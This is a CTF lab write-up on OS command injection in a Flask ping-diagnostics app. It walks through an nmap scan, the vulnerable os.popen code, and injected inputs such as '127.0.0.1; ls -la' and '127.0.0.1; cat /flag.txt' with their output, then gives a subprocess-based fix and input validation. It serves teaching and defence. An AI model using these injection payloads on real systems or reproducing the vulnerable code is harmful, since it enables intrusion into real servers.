---
title: "Writeup: Flask Command Injection"
date: "2026-03-24"
author: "Dock & Root"
tags: ["Writeup", "Command Injection", "Linux", "Python", "Flask", "Easy"]
thumbnail: "../img/avatar-docker-escape.png"
---

# Writeup: Flask Command Injection

This is a comprehensive walkthrough for completing the **Flask Command Injection** lab, a heavily focused challenge designed to test your ability to chain basic Linux commands through a vulnerable web application interface.

## 1. Enumeration

After spinning up the Docker container, our first step is to enumerate the target. A standard Nmap scan against the container's IP address reveals a single open port.

```bash
nmap -sV -sC 127.0.0.1 -p 5000
```

* **Port 5000/tcp:** Running a Python Werkzeug HTTP server (Flask).

Navigating to `http://127.0.0.1:5000` in our browser, we are presented with a "Network Diagnostics Panel." The interface has a single input field asking us to "Enter an IP address below to test connectivity."

## 2. Analyzing the Web Application

The application is essentially a wrapper for the `ping` utility. If we enter `127.0.0.1` and hit "Run Ping", the server pauses for a few seconds and then displays the standard output of the Linux `ping` command.

This behavior strongly suggests that the backend is taking our input and passing it directly into a system shell to execute the command. 

```python
# The suspected backend logic
cmd = f"ping -c 3 {user_input}"
os.popen(cmd)
```

## 3. Exploitation (Remote Code Execution)

If the application is not sanitizing our input, we can break out of the `ping` command and append our own arbitrary commands using shell operators. In Linux bash, the semi-colon (`;`) acts as a command separator, allowing multiple commands to execute sequentially.

Let's test this theory by attempting to list the current directory contents (`ls -la`). In the input field, we submit:
```bash
127.0.0.1; ls -la
```

**Output Response:**
```text
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
... (ping output) ...
total 16
drwxr-xr-x 1 ctf ctf 4096 Mar 24 10:48 .
drwxr-xr-x 1 root root 4096 Mar 24 10:48 ..
-rw-r--r-- 1 ctf ctf  843 Mar 24 10:48 app.py
```

The server successfully executed `ls -la` and returned the output! We have achieved Remote Code Execution (RCE). 
We can see the application is running as the user `ctf` and the source code `app.py` is present.

## 4. Capturing the Flag

Our objective is to locate and read the contents of `/flag.txt`. Given that we can execute arbitrary commands, capturing the flag is trivial.

We enter the following payload into the Diagnostics Panel:
```bash
127.0.0.1; cat /flag.txt
```

**Output Response:**
```text
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
...
DR{0s_c0mm4nd_1nj3ct10n_m4st3r}
```

We have successfully extracted the flag!

---

## 🛡️ Mitigation & Patching

OS Command Injection occurs when an application passes unsafe user-supplied data to a system shell. To patch this vulnerability in Python:

1. **Avoid `os.popen()` or `os.system()`:** These functions invoke a subshell (`/bin/sh -c`), which interprets shell meta-characters like `;`, `&&`, and `|`.
2. **Use `subprocess.run()` without `shell=True`:** Pass the command and arguments as a strictly defined array. This bypasses the shell entirely, neutralizing injection operators.

**Vulnerable Code:**
```python
import os
os.popen(f"ping -c 3 {ip}")
```

**Secure Code:**
```python
import subprocess
try:
    # Notice the arguments are separated into a strict list
    result = subprocess.run(['ping', '-c', '3', ip], capture_output=True, text=True, timeout=5)
    output = result.stdout
except Exception as e:
    output = str(e)
```

Additionally, implementing strong strict input validation (e.g., using regex to ensure the input strictly matches an IPv4 address format) completely eliminates the attack surface.
